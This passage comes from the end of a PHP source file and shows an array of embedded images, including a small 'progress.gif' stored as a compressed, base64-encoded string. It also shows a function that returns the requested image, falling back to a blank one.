              HUsNDVuaPV+KaeAa1TvWb0yh3jZbS09paGuSpTesfjuHFJtc3vgN2mjs6fNaMYEOqfHFAe3t1Yk/
              I562iLL0VsxHDAvLnQjamXSYn1z6L13z8Ru/VY7ZpReMlD/91fTqHRBHc2tvrH4/N3an2qWBhbmU
              aWG4slNtjrybG35NyLVYR4PH6qTCbFZRmbfkxPCSMTEiYWWTMILWoPBe1Ev7QMxHUsiLAwbTesrC
              1rfX1q6fylCptwmp24JZt0fM8h3KgS7HEInnyndHzl43Ya+Fls+j2xSi2zeW9pyltazGGBlK9/24
              a++LXzWRk+uiPTDWzb6CieiqkTe4g5kzCuYNWG8y7xenfr3cWulwk55LUcXRkj/FJ546DKn8z1eg
              MKLuq/v8I1dxGGE9ExXmKs95fqFpYBDf3x3I6+NRtvUKKM3ly9IfYgnPgFphVnXFJhtrGc5Ck0K6
              ToGzBREw2t2IQ7qxhVjXd0UpwAsH1CKl5de4t4oQpW1A04DTp+89HByOfW+zqV2ptLd5GqUttyPU
              r8Xi2dG74tjU71TEKqpgjek4i5UcUFDfAtjtGUYu0K5fCgRY8Qd/AbszsfJnAma/zxg2k/LDJFNd
              iO0slTG1QZ8okPOwvyO3/2BL5U0GO/kx8Mvravmf/raRq60PLoTrSGzlHLYL3eulrZ05K3kZjFj7
              5B1sZKPhs7mo4vo67dzSBBUk5x4qBy52C94W6dxCxbu8FcmptulFvqD/vxZRO5ruq3o8PbbWu0HS
              aHfjJf6Sv+2S8bNzxggnF+PyrSgHApiS0vmDj0exOV/hxX2WftpH9EWtVVcVcbQ5yxdci0ruL4Wm
              SlnNz/I+utChz74RO5R0KkvxFfp0ugCv6n8wOIhHnUGW62DBdPWUQtzc4Z2QmLUt7WtjuKu3ik75
              4dJ4UMCv/AMYloGFIaXDXmmKFHLVHwbdKGALbilV17okpJ6hrCISWvNS7JIlthLa0egbaVr5y2jw
              0qb56FF/p9AcKX8N54VmK2B0OkRXE640UeKNqlaNj9VDutkchWEAEDSASXl0C0nH/j02DdjrfNDp
              mQOZ8X/oxMb+"
    		),
		   'progress.gif' => array( 
		     'type'=>'gif', width=>'16', height=>'16',
		     'code'=>"eJxz93SzsEwUYBBg+MTA8P//fwYGhkOHDjk5OQEZSUlJTU1NkyZNUvzP7ecaEuzsGOBqpGfAzAiU
		              U/wn61SamVOiUJ5ZkqHg7umm4Jtflpmq4J6aWKRgomcAVCDqm5iSqpBUqeCYlVjhk5+YopeZl5bP
		              oPiThZMLaIIOEDOALGZgNubYdeefwSnPbOFkDisOyTnsfjPSOF03Gh7aJTLz4Da9hCOHCi/oRktY
		              3l3GbinBw+6V/dyDAZs5JiBz/HoUFaRbeHZveNblUugUGJJgKKmQ4OMaLbWiRmZr6f23iRLsDQrX
		              JR61OUtuUlXREsJmkBnHLiNl7VOOJyacmRKmz9aaLMP3RdLvo6dT4ozVBTIfuM5s3itzbIU2U+Rb
		              8T+MzYf5jVamSM3fz4LDb0mq2qeM2ia+mRMW39q9jLNVkYfF0KU9UUZwlVvThovyzElBsZ9t5Q0s
		              dKT6TywpsvTB6jcjjl1F6tpez1NEPkh89mnkUSs7nBCTFDKltWWnXEakk+b5Uw4CzHIvbeQPq4HN
		              CZqE1RigcxQOTbAUf1zyfM+teQaSx2UeKOo5bZt7KnzNIkMeNm6R4sTdG0y/T2VsNNjA2bl7fq6m
		              Fy7n3Pn3gVPw5pzQ2FmM724VFkxN6LibOOeuybRWR7ejBiITEmZvY+RlOeQgMNuw4dC1cxNxGwOM
		              +dWpTlfmaF6X4+A4rNB3vJCPxdBg5akN6wIkDgGjK+zWUiaF0iSJpnnRghMYGKwZYAAA7e/aGw=="
		    )
		  );
		  if (isset($images[$name])) return $images[$name]; 
		   else return $images['blank.gif'];
		 }
		}
?>